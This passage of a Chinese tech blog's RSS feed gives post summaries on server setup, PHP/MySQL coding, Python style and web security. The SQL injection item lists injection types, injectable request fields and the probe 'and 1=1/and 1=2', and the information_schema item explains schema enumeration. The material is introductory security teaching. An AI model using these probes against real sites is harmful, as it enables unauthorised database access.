      <description> 0x00 information_schema  information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表， 每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 information_schema的表schemata中的列schema_name记录了所有数据库的名字 information_schema的表tables中的列table_schema记录了所有数据库的名字 information_schema的表tables中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列table_schema记录了所有数据库的名字 information_schema的表columns中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列column_name记录了所有数据库的表的列的名字   0x01 information_schema的SCHEMATA表   0x02 information_schema的TABLES表   0x03 information_schema的COLUMNS表   </description>
    </item>
    
    <item>
      <title>SQL注入</title>
      <link>http://wyb0.com/posts/injection/</link>
      <pubDate>Sun, 19 Jun 2016 19:40:25 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection/</guid>
      <description>0x00 含义  sql注入是将代码插入(拼接)到应用(用户)的输入参数中， 之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击， 总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。   0x01 成因  SQl语句未对用户参数进行严格过滤   0x02 可引发注入的地方  其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入 常见的如下，按出现频率排序： 1. GET 2. POST 3. X-Forwarded-For 4. Cookie 5. User-Agent   0x03 注入分类  根据语法(较权威)： 1. 可联合查询注入: 只要页面有显示位即可使用，且注入速度很快 2. 报错型注入: 没有显示位但用echo &amp;quot;mysql_error()&amp;quot;输出了错误信息，速度很快，但是语句较复杂 3. 布尔型注入: 一次一个字节，速度慢，但只要有注入就能用 4. 基于时间延迟注入: 超级慢，比布尔型注入慢几倍，但是通用性较强 5. 可多语句查询: 只有SQL Server可以使用 根据类型： 1. 整形 2. 字符串型 3. 搜索型   0x04 查找注入点  在URL中： 1. and 1=1/and 1=2(整型) 2.</description>
    </item>
    
    <item>
      <title>渗透测试流程(单台服务器)</title>
      <link>http://wyb0.com/posts/pentest-process/</link>
      <pubDate>Sun, 19 Jun 2016 19:31:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/pentest-process/</guid>
      <description> 针对单台服务器的渗透流程 </description>
    </item>
    
    <item>
      <title>Windows2003下搭建IIS&#43;asp</title>
      <link>http://wyb0.com/posts/windows2003-set-up-iis-asp/</link>
      <pubDate>Sat, 18 Jun 2016 20:39:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows2003-set-up-iis-asp/</guid>
      <description> 添加组件 开启iis 添加Web服务扩展 运行asp 权限 </description>
    </item>
    
    <item>
      <title>Linux下搭建FTP</title>
      <link>http://wyb0.com/posts/linux-set-up-ftp/</link>
      <pubDate>Sat, 18 Jun 2016 09:40:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-set-up-ftp/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal  安装 yum install vsftpd
配置  备份
cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak
 编辑配置文件
vim /etc/vsftpd/vsftpd.conf anonymous_enable=NO #设定不允许匿名访问 local_enable=YES #设定本地用户可以访问 chroot_list_enable=YES #使用户不能离开主目录 xferlog_file=/var/log/vsftpd.log #设定vsftpd的服务日志 ascii_upload_enable=YES ascii_download_enable=YES #设定支持ASCII pam_service_name=vsftpd #PAM认证文件名,PAM将根据/etc/pam.d/vsftpd进行认证 # 并在尾部追加： guest_enable=YES #设定启用虚拟用户功能。 guest_username=ftp #指定虚拟用户的宿主用户。-CentOS中已经有内置的ftp用户了 guest_config_dir=/etc/vsftpd/vuser_conf #设定虚拟用户个人vsftp的配置文件存放路径。存放虚拟用户个性化的配置文件名，和虚拟用户名相同  新增chroot_list并将ftp用户输入进去
touch /etc/vsftpd/chroot_list
echo ftp &amp;gt;&amp;gt; /etc/vsftpd/chroot_list
 安装Berkeley DB工具用来对虚拟用户认证配置管理：
yum install db4 db4-utils
 创建用户账户文件
vim /etc/vsftpd/vuser_passwd.txt user1 #奇数行是用户名 123456 #偶数行是密码 user2 #奇数行是用户名 666666 #偶数行是密码 user3 #奇数行是用户名 user3 #偶数行是密码  用Berkeley DB工具生成认证文件</description>
    </item>
    
    <item>
      <title>Linux下搭建Tomcat&#43;MySQL&#43;JSP</title>
      <link>http://wyb0.com/posts/linux-set-up-tomcat-mysql-jsp/</link>
      <pubDate>Fri, 17 Jun 2016 23:08:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-set-up-tomcat-mysql-jsp/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal  安装mysql sudo yum install mysql mysql-server mysql-devel
安装jdk和tomcat  创建安装jdk和tomcat的文件夹  下载安装包并解压安装
jdk包可在http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 下载
tomcat包可在http://mirrors.cnnic.cn/apache/tomcat/tomcat-8/v8.0.36/bin/apache-tomcat-8.0.36.tar.gz 下载   简单配置tomcat 启动tomcat 连接数据库 驱动可在http://dev.mysql.com/downloads/connector/j/ 下载 [reber@WYB ~]$ vim /opt/tomcat/apache-tomcat-8.0.36/webapps/ROOT/a.jsp
&amp;lt;%@page contentType=&amp;quot;text/html;charset=utf-8&amp;quot; import=&amp;quot;java.sql.*&amp;quot; %&amp;gt; &amp;lt;% String driver = &amp;quot;com.mysql.jdbc.Driver&amp;quot;; String url = &amp;quot;jdbc:mysql://localhost:3306/tomcat&amp;quot;; //数据库web String user = &amp;quot;tomcat&amp;quot;; String password = &amp;quot;123456&amp;quot;; try { Class.forName(driver); Connection conn = DriverManager.</description>
    </item>
    
    <item>
      <title>Linux下搭建Nginx&#43;MySQL&#43;PHP</title>
      <link>http://wyb0.com/posts/linux-set-up-nginx-mysql-php/</link>
      <pubDate>Fri, 17 Jun 2016 22:41:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-set-up-nginx-mysql-php/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal  一、准备工作 首先执行： sudo yum groupinstall &amp;quot;Development tools&amp;quot; 安装make： yum -y install gcc automake autoconf libtool make 安装g++： yum install gcc gcc-c++  二、安装mysql和php sudo yum install mysql mysql-server mysql-devel sudo yum install php php-devel sudo yum install php-gd php-mysql php-fpm  三、安装依赖  安装pcre、pcre-devel
sudo yum install pcre pcre-devel
 安装zlib、zlib-devel
sudo yum install zlib zlib-devel
 安装ssl
sudo yum install openssl openssl-devel
  四、安装Nginx 可在http://nginx.org/download/nginx-1.9.9.tar.gz 下载 [reber@WYB nginx-1.</description>
    </item>
    
    <item>
      <title>Python第三方模块的安装</title>
      <link>http://wyb0.com/posts/python-install-third-party-modules/</link>
      <pubDate>Wed, 15 Jun 2016 13:08:00 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-install-third-party-modules/</guid>
      <description> 第三方模块安装方法  使用工具easy_install 使用工具pip(easy_install的升级版，还不能完全取代) 直接在https://pypi.python.org/pypi 下载安装  使用easy_install安装  在https://bootstrap.pypa.ip/ez_setup.py 下载安装脚本 然后执行python ez_setup.py即可安装easy_install 安装：easy_install PackageName 升级：easy_install -U PackageName   使用pip安装  在https://bootstrap.pypa.io/get-pip.py 下载安装脚本 然后执行python get-pip.py即可安装pip 安装：pip install PackageName 升级：pip install --upgrade PackageName 删除：pip uninstall PackageName   网站下载安装包  在https://pypi.python.org/pypi 直接下载相应的exe或者py文件安装
 </description>
    </item>
    
    <item>
      <title>Ubuntu下使用ShadowSocks</title>
      <link>http://wyb0.com/posts/ubuntu-use-shadowsocks/</link>
      <pubDate>Mon, 13 Jun 2016 09:14:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-use-shadowsocks/</guid>
      <description> 环境： ubuntu14.4
安装shadowsocks-qt5 sudo add-apt-repository ppa:hzwhuang/ss-qt5（添加源） sudo apt-get update （更新你的软件库） sudo apt-get install shadowsocks-qt5 (正式安装)  配置客户端 配置火狐 访问YouTube </description>
    </item>
    
    <item>
      <title>Python编写规范</title>
      <link>http://wyb0.com/posts/python-coding-style/</link>
      <pubDate>Sun, 12 Jun 2016 22:17:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-coding-style/</guid>
      <description>0x00 代码编排  1.缩进：使用4个空格缩进 2.行长度：每行不要超过80个字符 3.空行：顶级定义之间空两行，如函数或类的定义，方法定义、类定义与第一个方法之间都应该空一行。 4.分号：行尾不要有分号，也不要用分号将两条命令放在一行,除非是： 1.长的导入模块语句。 2.注释里的URL. 3.可以使用圆括号实现隐式行连接   0x01文档编排  1.导入：模块注释-&amp;gt;文档字符串-&amp;gt;导入-&amp;gt;模块全局变量-&amp;gt;常量 导入顺序：标准库导入-&amp;gt;第三方库导入-&amp;gt;应用程序指定库导入 2.import:不要在一行中import多个库，一行中只导入一个   0x02 空格  1.不要在逗号、分号、冒号前加空格，但应在他们后面加(除了在行尾) 2.二元操作符(赋值、比较、布尔)两边都加空格 3.当&amp;quot;=&amp;quot;用于指示关键字参数或默认参数值是，不要再其两侧使用空格 4.&amp;quot;,&amp;quot;和&amp;quot;#&amp;quot;和&amp;quot;=&amp;quot;不需要对齐，因为空格会成为维护的负担   0x03 注释  总体原则，错误的注释不如没有注释。 注释必须使用英文，最好是完整的句子，首字母大写，句后要有结束符，结束符后跟两个空格，开始下一句。如果是短语，可以省略结束符。 1.块注释：在一段代码前增加的注释。在&amp;quot;#&amp;quot;后加一空格。段落之间以只有&amp;quot;#&amp;quot;的行间隔。 2.行注释，在一句代码后加注释。进来少使用. 3.绝不要描述代码. 假设阅读代码的人比你更懂Python, 他只是不知道你的代码要做什么.   0x04 文档描述  1.为所有的共有模块、函数、类、方法写docstrings；非共有的没有必要，但是可以写注释（在def的下一行）。 2.如果docstring要换行，参考如下例子 class SampleClass(object): &amp;quot;&amp;quot;&amp;quot;Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid.</description>
    </item>
    
    <item>
      <title>conky配置</title>
      <link>http://wyb0.com/posts/conky-configuration/</link>
      <pubDate>Sat, 04 Jun 2016 20:26:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/conky-configuration/</guid>
      <description>0x00 效果  使用软件conky可以在linux上看到系统的运行状态，效果如下：  0x01 安装与配置  先安装conky：
sudo apt-get install conky
 在/home/username/下创建文件.conkyrc
 使conky开机自启
在/etc/profile最下面添加：/usr/bin/conky &amp;amp;
  0x03 配置文件.conkyrc内容如下  # set to yes if you want Conky to be forked in the background background no cpu_avg_samples 2 net_avg_samples 2 out_to_console no # X font when Xft is disabled, you can pick one with program xfontsel #font 7x12 #font 6x10 #font 7x13 #font 8x13 #font 7x12 #font *mintsmild.</description>
    </item>
    
    <item>
      <title>RGB颜色对照表</title>
      <link>http://wyb0.com/posts/rgb-color-look-up-table/</link>
      <pubDate>Sat, 04 Jun 2016 20:03:10 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/rgb-color-look-up-table/</guid>
      <description>RGB    RGB颜色对照表
    #FFFFFF  #FFFFF0  #FFFFE0  #FFFF00    #FFFAFA  #FFFAF0  #FFFACD  #FFF8DC    #FFF68F  #FFF5EE  #FFF0F5  #FFEFDB    #FFEFD5  #FFEC8B  #FFEBCD  #FFE7BA    #FFE4E1  #FFE4C4  #FFE4B5  #FFE1FF    #FFDEAD  #FFDAB9  #FFD700  #FFD39B    #FFC1C1  #FFC125  #FFC0CB  #FFBBFF    #FFB90F  #FFB6C1  #FFB5C5  #FFAEB9    #FFA54F  #FFA500  #FFA07A  #FF8C69    #FF8C00  #FF83FA  #FF82AB  #FF8247    #FF7F50  #FF7F24  #FF7F00  #FF7256    #FF6EB4  #FF6A6A  #FF69B4  #FF6347    #FF4500  #FF4040  #FF3E96  #FF34B3    #FF3030  #FF1493  #FF00FF  #FF0000    #FDF5E6  #FCFCFC  #FAFAFA  #FAFAD2    #FAF0E6  #FAEBD7  #FA8072  #F8F8FF    #F7F7F7  #F5FFFA  #F5F5F5  #F5F5DC    #F5DEB3  #F4F4F4  #F4A460  #F2F2F2    #F0FFFF  #F0FFF0  #F0F8FF  #F0F0F0    #F0E68C  #F08080  #EEEEE0  #EEEED1    #EEEE00  #EEE9E9  #EEE9BF  #EEE8CD    #EEE8AA  #EEE685  #EEE5DE  #EEE0E5    #EEDFCC  #EEDC82  #EED8AE  #EED5D2    #EED5B7  #EED2EE  #EECFA1  #EECBAD    #EEC900  #EEC591  #EEB4B4  #EEB422    #EEAEEE  #EEAD0E  #EEA9B8  #EEA2AD    #EE9A49  #EE9A00  #EE9572  #EE82EE    #EE8262  #EE7AE9  #EE799F  #EE7942    #EE7621  #EE7600  #EE6AA7  #EE6A50    #EE6363  #EE5C42  #EE4000  #EE3B3B    #EE3A8C  #EE30A7  #EE2C2C  #EE1289    #EE00EE  #EE0000  #EDEDED  #EBEBEB    #EAEAEA  #E9967A  #E8E8E8  #E6E6FA    #E5E5E5  #E3E3E3  #E0FFFF  #E0EEEE    #E0EEE0  #E0E0E0  #E066FF  #DEDEDE    #DEB887  #DDA0DD  #DCDCDC  #DC143C    #DBDBDB  #DB7093  #DAA520  #DA70D6    #D9D9D9  #D8BFD8  #D6D6D6  #D4D4D4    #D3D3D3  #D2B48C  #D2691E  #D1EEEE    #D1D1D1  #D15FEE  #D02090  #CFCFCF    #CDCDC1  #CDCDB4  #CDCD00  #CDC9C9    #CDC9A5  #CDC8B1  #CDC673  #CDC5BF    #CDC1C5  #CDC0B0  #CDBE70  #CDBA96    #CDB7B5  #CDB79E  #CDB5CD  #CDB38B    #CDAF95  #CDAD00  #CDAA7D  #CD9B9B    #CD9B1D  #CD96CD  #CD950C  #CD919E    #CD8C95  #CD853F  #CD8500  #CD8162    #CD7054  #CD69C9  #CD6889  #CD6839    #CD661D  #CD6600  #CD6090  #CD5C5C    #CD5B45  #CD5555  #CD4F39  #CD3700    #CD3333  #CD3278  #CD2990  #CD2626    #CD1076  #CD00CD  #CD0000  #CCCCCC    #CAFF70  #CAE1FF  #C9C9C9  #C7C7C7    #C71585  #C6E2FF  #C67171  #C5C1AA    #C4C4C4  #C2C2C2  #C1FFC1  #C1CDCD    #C1CDC1  #C1C1C1  #C0FF3E  #BFEFFF    #BFBFBF  #BF3EFF  #BEBEBE  #BDBDBD    #BDB76B  #BCEE68  #BCD2EE  #BC8F8F    #BBFFFF  #BABABA  #BA55D3  #B9D3EE    #B8B8B8  #B8860B  #B7B7B7  #B5B5B5    #B4EEB4  #B4CDCD  #B452CD  #B3EE3A    #B3B3B3  #B2DFEE  #B23AEE  #B22222    #B0E2FF  #B0E0E6  #B0C4DE  #B0B0B0    #B03060  #AEEEEE  #ADFF2F  #ADD8E6    #ADADAD  #ABABAB  #AB82FF  #AAAAAA    #A9A9A9  #A8A8A8  #A6A6A6  #A52A2A    #A4D3EE  #A3A3A3  #A2CD5A  #A2B5CD    #A1A1A1  #A0522D  #A020F0  #9FB6CD    #9F79EE  #9E9E9E  #9C9C9C  #9BCD9B    #9B30FF  #9AFF9A  #9ACD32  #9AC0CD    #9A32CD  #999999  #9932CC  #98FB98    #98F5FF  #97FFFF  #96CDCD  #969696    #949494  #9400D3  #9370DB  #919191    #912CEE  #90EE90  #8FBC8F  #8F8F8F    #8EE5EE  #8E8E8E  #8E8E38  #8E388E    #8DEEEE  #8DB6CD  #8C8C8C  #8B8B83    #8B8B7A  #8B8B00  #8B8989  #8B8970    #8B8878  #8B8682  #8B864E  #8B8386    #8B8378  #8B814C  #8B7E66  #8B7D7B    #8B7D6B  #8B7B8B  #8B795E  #8B7765    #8B7500  #8B7355  #8B6969  #8B6914    #8B668B  #8B6508  #8B636C  #8B5F65    #8B5A2B  #8B5A00  #8B5742  #8B4C39    #8B4789  #8B475D  #8B4726  #8B4513    #8B4500  #8B3E2F  #8B3A62  #8B3A3A    #8B3626  #8B2500  #8B2323  #8B2252    #8B1C62  #8B1A1A  #8B0A50  #8B008B    #8B0000  #8A8A8A  #8A2BE2  #8968CD    #87CEFF  #87CEFA  #87CEEB  #878787    #858585  #848484  #8470FF  #838B8B    #838B83  #836FFF  #828282  #7FFFD4    #7FFF00  #7F7F7F  #7EC0EE  #7D9EC0    #7D7D7D  #7D26CD  #7CFC00  #7CCD7C    #7B68EE  #7AC5CD  #7A8B8B  #7A7A7A    #7A67EE  #7A378B  #79CDCD  #787878    #778899  #76EEC6  #76EE00  #757575    #737373  #71C671  #7171C6  #708090    #707070  #6E8B3D  #6E7B8B  #6E6E6E    #6CA6CD  #6C7B8B  #6B8E23  #6B6B6B    #6A5ACD  #698B69  #698B22  #696969    #6959CD  #68838B  #68228B  #66CDAA    #66CD00  #668B8B  #666666  #6495ED    #63B8FF  #636363  #616161  #607B8B    #5F9EA0  #5E5E5E  #5D478B  #5CACEE    #5C5C5C  #5B5B5B  #595959  #575757    #556B2F  #555555  #551A8B  #54FF9F    #548B54  #545454  #53868B  #528B8B    #525252  #515151  #4F94CD  #4F4F4F    #4EEE94  #4D4D4D  #4B0082  #4A708B    #4A4A4A  #48D1CC  #4876FF  #483D8B    #474747  #473C8B  #4682B4  #458B74    #458B00  #454545  #43CD80  #436EEE    #424242  #4169E1  #40E0D0  #404040    #3D3D3D  #3CB371  #3B3B3B  #3A5FCD    #388E8E  #383838  #36648B  #363636    #333333  #32CD32  #303030  #2F4F4F    #2E8B57  #2E2E2E  #2B2B2B  #292929    #282828  #27408B  #262626  #242424    #228B22  #218868  #212121  #20B2AA    #1F1F1F  #1E90FF  #1E1E1E  #1C86EE    #1C1C1C  #1A1A1A  #191970  #1874CD    #171717  #141414  #121212  #104E8B    #0F0F0F  #0D0D0D  #0A0A0A  #080808    #050505  #030303  #00FFFF  #00FF7F    #00FF00  #00FA9A  #00F5FF  #00EEEE    #00EE76  #00EE00  #00E5EE  #00CED1    #00CDCD  #00CD66  #00CD00  #00C5CD    #00BFFF  #00B2EE  #009ACD  #008B8B    #008B45  #008B00  #00868B  #00688B    #006400  #0000FF  #0000EE  #0000CD    #0000AA  #00008B  #000080  #000000</description>
    </item>
    
    <item>
      <title>PHP之封装MySQL类</title>
      <link>http://wyb0.com/posts/php-package-mysql-function/</link>
      <pubDate>Fri, 03 Jun 2016 11:19:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-package-mysql-function/</guid>
      <description>0x00 config.inc.php内容如下  &amp;lt;?php return array( &#39;DB_HOST&#39; =&amp;gt; &#39;192.168.188.134&#39;, &#39;DB_NAME&#39; =&amp;gt; &#39;scoreboard&#39;, &#39;DB_USER&#39; =&amp;gt; &#39;score&#39;, &#39;DB_PASS&#39; =&amp;gt; &#39;123456&#39;, &#39;DB_CHARSET&#39; =&amp;gt; &#39;utf8&#39;, &#39;IS_LOG&#39; =&amp;gt; 1,//开启日志 &#39;LOGFILEPATH&#39; =&amp;gt; &#39;../log.txt&#39;//日志路径 ); /* $database = require(&#39;./config.php&#39;); echo $database[&#39;DB_TYPE&#39;]; //输出&#39;DB_TYPE&#39; */ ?&amp;gt;   0x01 表设计如下  create database scoreboard; use scoreboard; drop table if exists users; create table users( id int not null auto_increment primary key, gid int not null default &#39;xiaoming&#39; comment &#39;组id&#39;, username varchar(20) not null default &#39;xiaoming&#39; comment &#39;用户名&#39;, password varchar(32) not null default &#39;123456&#39; comment &#39;密码&#39;, sex varchar(2) not null default &#39;0&#39; comment &#39;性别&#39;, totalscore int not null default &#39;0&#39; comment &#39;个人总积分&#39; ); drop table if exists share; create table share( id int not null auto_increment primary key, uid int not null, content varchar(1024) not null default &#39;content&#39; comment &#39;分享内容&#39;, comment varchar(1024) comment &#39;点评&#39;, date varchar(15) not null default &#39;20150101&#39; comment &#39;分享日期&#39; ); drop table if exists score; create table score( id int not null auto_increment primary key, uid int not null default &#39;0&#39; comment &#39;用户id&#39;, score int not null default &#39;0&#39; comment &#39;用户单次积分&#39;, ); grant all privileges on scoreboard.</description>
    </item>
    
    <item>
      <title>PHP之MySQL常用函数</title>
      <link>http://wyb0.com/posts/php-mysql-common-function/</link>
      <pubDate>Thu, 02 Jun 2016 13:21:49 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-mysql-common-function/</guid>
      <description>处理函数  mysql_connect(server,user,pwd,newlink,clientflag)
连接服务器的函数,成功则返回MySQL标识，失败则返回FALSE
 mysql_select_db(database,connection)
选择数据库的函数，成功则返回true，失败则返回false
 mysql_query(query,connection)
执行一条查询，返回一个资源标识符(结果集)，如果查询执行不正确则返回FALSE
 mysql_num_rows(data)和mysql_num_fields(data)
函数分别返回结果集中行和列的数目(禁对SELECT语句有效),结果集从 mysql_query()的调用中得到
 mysql_fetch_assoc(data)
从结果集中取得一行作为关联数组，若没有更多行则返回false
 mysql_fetch_row(data)
从结果集中取得一行作为索引数组，若没有更多行则返回false
 mysql_error(connection)
返回上一个MySQL函数的错误文本，如果没有出错则返回&amp;rdquo;(空字符串)
 mysql_affected_rows(link_identifier)
返回前一次MySQL操作(增删改)所影响的记录行数,失败则返回-1
 mysql_insert_id(connection)
返回上一步INSERT操作产生的 ID。如果上一查询没有产生AUTO_INCREMENT的ID，则mysql_insert_id()返回 0。
 mysql_data_seek(data,row)
结果集data从mysql_query()的调用中得到,行指针移动到指定的行号，接着调用 mysql_fetch_row() 将返回那一行。如果成功则返回 true，失败则返回 false
  例子 &amp;lt;?php $server = &amp;quot;127.0.0.1&amp;quot;; $dbname = &amp;quot;massage&amp;quot;; $user = &amp;quot;msg&amp;quot;; $pass = &amp;quot;123456&amp;quot; $conn = mysql_connect($server,$user,$pass) or die(&#39;连接服务器失败:&#39;.mysql_error()); mysql_query(&amp;quot;set names &#39;utf8&#39;&amp;quot;);//设置数据库输出编码 mysql_select_db($dbname,$conn) or die(mysql_error($conn)); //选择数据库 $sql = &amp;quot;select username,password from user&amp;quot;; //构造sql语句 $result = mysql_query($sql); //执行sql语句，返回结果集 $num = mysql_num_rows($result);//返回执行结果的行数 echo &amp;quot;&amp;lt;br /&amp;gt;结果的行数:{$num}&amp;lt;br /&amp;gt;&amp;quot;; while ($row = mysql_fetch_assoc($result)) { echo $row[id].</description>
    </item>
    
    <item>
      <title>MySQL语法</title>
      <link>http://wyb0.com/posts/mysql-syntax/</link>
      <pubDate>Thu, 02 Jun 2016 11:19:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/mysql-syntax/</guid>
      <description>Select语句的一般语法 1.SELECT [ALL|DISTINCT] &amp;lt;目标列表达式&amp;gt; [,&amp;lt;目标列表达式&amp;gt; ]... 2.FROM &amp;lt;表名或视图名&amp;gt; [,&amp;lt;表名或视图名&amp;gt; ]... 3.[ WHERE &amp;lt;行条件表达式&amp;gt; ] 4.[ GROUP BY &amp;lt;列名1&amp;gt; ,[列名2][,...][HAVING组条件表达式] ] 5.[ ORDER BY &amp;lt;列名1&amp;gt; ,[ASC|DESC][,...] ];  上面5个句子书写时按顺序，尽量一个句子一行，但在机器内部执行时的顺序是2-3-4-1-5，
即先确定从哪个数据源查找，
然后确定过滤条件，
若有分组则对过滤后的记录进行分组，若分组有限制条件则对分组进一布限制，
然后将符合条件的列查询出来，
最后对结果进行排序。
select name as &#39;名字&#39;,password as &#39;密码&#39; form user; select * from message where id between 2 and 6; select * from message where title like &#39;%留言_&#39;; //%匹配任意个字符,_匹配一个字符 select * from message where uid in (2,3,4); //删除2、3、4共3条数据  连接查询 [&amp;lt;表名1&amp;gt;.</description>
    </item>
    
    <item>
      <title>win/ubuntu双系统分区设置</title>
      <link>http://wyb0.com/posts/win-and-ubuntu-partition/</link>
      <pubDate>Tue, 31 May 2016 23:35:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/win-and-ubuntu-partition/</guid>
      <description> win10和ubuntu双系统分区设置  硬盘采用uefi格式 硬盘首部留400M空间，是FAT16的格式，用来存放win的引导信息 在硬盘末尾给ubuntu划分50G左右空间 ubuntu的/分区，格式为ext4，空间为40G ubuntu的/home分区，格式为ext4，空间为10G ubuntu的/boot分区，格式为ext4,空间为200M ubuntu的/swap分区，格式为swap，空间为200M ubuntu的引导分区为/boot  &amp;nbsp; </description>
    </item>
    
    <item>
      <title>PHP之MySQL简单操作</title>
      <link>http://wyb0.com/posts/php-mysql-curd/</link>
      <pubDate>Sun, 29 May 2016 22:50:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-mysql-curd/</guid>
      <description>0x00 连接数据库   0x01 查看数据库   0x02 创建数据库  一般将sql语句保存在文本中，然后复制运行
create database test; use test; drop table if exists users; create table users( id int not null auto_increment primary key, username varchar(20) not null default &#39;xiaoming&#39; comment &#39;用户名&#39;, password varchar(32) not null default &#39;123456&#39; comment &#39;密码&#39; ); drop table if exists msg; create table msg( id int not null auto_increment primary key, uid int not null default &#39;0&#39; comment &#39;用户id&#39;, title varchar(30) not null default &#39;title&#39; comment &#39;信息标题&#39;, content varchar(1024) not null default &#39;content&#39; comment &#39;信息内容&#39;, ip varchar(15) not null default &#39;127.</description>
    </item>
    
    <item>
      <title>XML基础</title>
      <link>http://wyb0.com/posts/xml-basis/</link>
      <pubDate>Wed, 25 May 2016 13:59:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xml-basis/</guid>
      <description>0x00 XML简介  xml的设计宗旨是传输数据，而并非显示数据 xms是不作为的，它被设计用来结构化、存储以及传输信息 xml只是纯文本，独立于软硬件和应用程序 xml可供任何软硬设备读取数据 xml可以自定义标签 xml具有自我描述性 xml是对html的补充 xml常用于简化数据的存储和共享   例子：John给George的便签
&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt; &amp;lt;note&amp;gt; //根元素 &amp;lt;to&amp;gt;George&amp;lt;/to&amp;gt; &amp;lt;from&amp;gt;John&amp;lt;/from&amp;gt; &amp;lt;heading&amp;gt;Reminder&amp;lt;/heading&amp;gt; &amp;lt;body&amp;gt;Don&#39;t forget the meeting!&amp;lt;/body&amp;gt; &amp;lt;/note&amp;gt;   0x01 XML树结构  必须有根节点 根节点可以有子节点   格式：
&amp;lt;root&amp;gt; &amp;lt;child&amp;gt; &amp;lt;subchild&amp;gt;.....&amp;lt;/subchild&amp;gt; &amp;lt;/child&amp;gt; &amp;lt;/root&amp;gt;  例子：
&amp;lt;books&amp;gt; &amp;lt;book&amp;gt; &amp;lt;name&amp;gt;Python黑帽子&amp;lt;/name&amp;gt; &amp;lt;date&amp;gt;2015&amp;lt;/date&amp;gt; &amp;lt;price&amp;gt;37￥&amp;lt;/price&amp;gt; &amp;lt;description&amp;gt; 用python写一些程序 &amp;lt;/description&amp;gt; &amp;lt;/book&amp;gt; &amp;lt;book&amp;gt; &amp;lt;name&amp;gt;Web安全深度剖析&amp;lt;/name&amp;gt; &amp;lt;date&amp;gt;2014&amp;lt;/date&amp;gt; &amp;lt;price&amp;gt;39￥&amp;lt;/price&amp;gt; &amp;lt;description&amp;gt; 讲述web渗透的基础知识 &amp;lt;/description&amp;gt; &amp;lt;/book&amp;gt; &amp;lt;book&amp;gt; &amp;lt;name&amp;gt;白帽子讲web安全&amp;lt;/name&amp;gt; &amp;lt;date&amp;gt;2013&amp;lt;/date&amp;gt; &amp;lt;price&amp;gt;44￥&amp;lt;/price&amp;gt; &amp;lt;description&amp;gt; 道哥力作 &amp;lt;/description&amp;gt; &amp;lt;/book&amp;gt; &amp;lt;/books&amp;gt;   0x02 XML语法规则  所有元素必有闭合标签 标签对大小写敏感 必须正确的嵌套 XML必须有根元素 XML的属性值必须加引号(能用子元素的就用子元素代替属性) 实体引用</description>
    </item>
    
    <item>
      <title>PHP之上传与下载</title>
      <link>http://wyb0.com/posts/php-upload-and-download/</link>
      <pubDate>Tue, 24 May 2016 08:31:09 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-upload-and-download/</guid>
      <description>上传 客户端设置  客户端使用form表单上传文件，在form表单中必须指明enctype和method属性的值   &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;post&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;xx.php&amp;quot; mothod=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;file&amp;quot; value=&amp;quot;myfile&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   服务端设置  php.ini:   file_uploads = On //默认允许HTTP文件上传，此选项不能设置为OFF upload_tmp_dir= //文件上传时存放文件的临时目录 upload_max_filesize = 20M //设定单个文件上传的大小，必须小于post_max_size post_max_size = 19M //允许POST表单的数据最大大小    $_FILES:
   $_FILES[&#39;upload_file&#39;][&#39;name&#39;] //带扩展名的原始文件名 $_FILES[&#39;upload_file&#39;][&#39;size&#39;] //文件大小 $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;] //临时文件名 $_FILES[&#39;upload_file&#39;][&#39;error&#39;] //上传文件时的错误信息 $_FILES[&#39;upload_file&#39;][&#39;type&#39;] //上传文件的类型 //type是上传文件时原始信息里的content_type,即MIME,有image/gig、text/html等 //error一般有5中类型： //0 上传成功 //1 文件大小超过了upload_max_filesize //2 文件大小超过了表单总MAX_FILE_SIZE设定的值 //3 只有部分被上传 //4 没有上传任何文件    服务端上传步骤   1.</description>
    </item>
    
    <item>
      <title>PHP之目录与文件</title>
      <link>http://wyb0.com/posts/php-directory-and-file/</link>
